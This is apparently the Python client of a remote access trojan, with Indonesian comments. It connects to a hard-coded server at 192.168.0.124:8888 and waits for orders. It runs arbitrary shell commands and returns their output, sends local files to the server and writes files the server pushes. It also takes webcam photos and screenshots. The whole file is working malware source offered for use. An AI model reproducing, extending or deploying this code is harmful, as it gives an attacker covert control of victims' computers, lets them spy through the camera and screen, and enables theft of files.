import socket
import json
import subprocess
import cv2
import pyautogui
import os

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.connect(('192.168.0.124', 8888))

def menerima_perintah():
    """Menerima data dari server dengan penanganan JSON yang aman."""
    data = ""
    while True:
        try:
            chunk = sc.recv(1024).decode()
            if not chunk:
                break
            data += chunk
            return json.loads(data)
        except json.JSONDecodeError:
            continue
def jalankan_perintah():
    """Menjalankan perintah dari server."""
    while True:
        perintah = menerima_perintah()

        if perintah["command"] == "exit":
            sc.close()
            break

        elif perintah["command"] == "execute":
            try:
                execute = subprocess.Popen(
                    perintah["cmd"],
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = execute.communicate()
                hasil = stdout.decode() + stderr.decode()
            except Exception as e:
                hasil = f"Error: {str(e)}"

            sc.sendall(json.dumps(hasil).encode())

        elif perintah["command"] == "download":
            file_name = perintah["file"]
            if os.path.exists(file_name):
                with open(file_name, "rb") as file:
                    while chunk := file.read(4096):
                        sc.sendall(chunk)
                sc.sendall(b"DONE")
            else:
                sc.sendall(json.dumps("File tidak ditemukan.").encode())

        elif perintah["command"] == "upload":
            file_name = perintah["file"]
            with open(file_name, "wb") as file:
                while True:
                    data = sc.recv(4096)
                    if data == b"DONE":
                        break
                    file.write(data)
        

        elif perintah["command"] == "kamera":
            try:
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    cv2.imwrite("kamera1.jpg", frame)
                    hasil = "Foto telah diambil dan disimpan sebagai kamera.jpg"
                else:
                    hasil = "Gagal mengambil foto"
                cam.release()
            except Exception as e:
                hasil = f"Error: {str(e)}"
            sc.sendall(json.dumps(hasil).encode())

        elif perintah["command"] == "screen_record":
            try:
                screenshot = pyautogui.screenshot()
                screenshot.save("screen.png")
                hasil = "Screenshot telah diambil dan disimpan sebagai screen.png"
            except Exception as e:
                hasil = f"Error: {str(e)}"
            sc.sendall(json.dumps(hasil).encode())

      

# Menjalankan fungsi utama
jalankan_perintah()

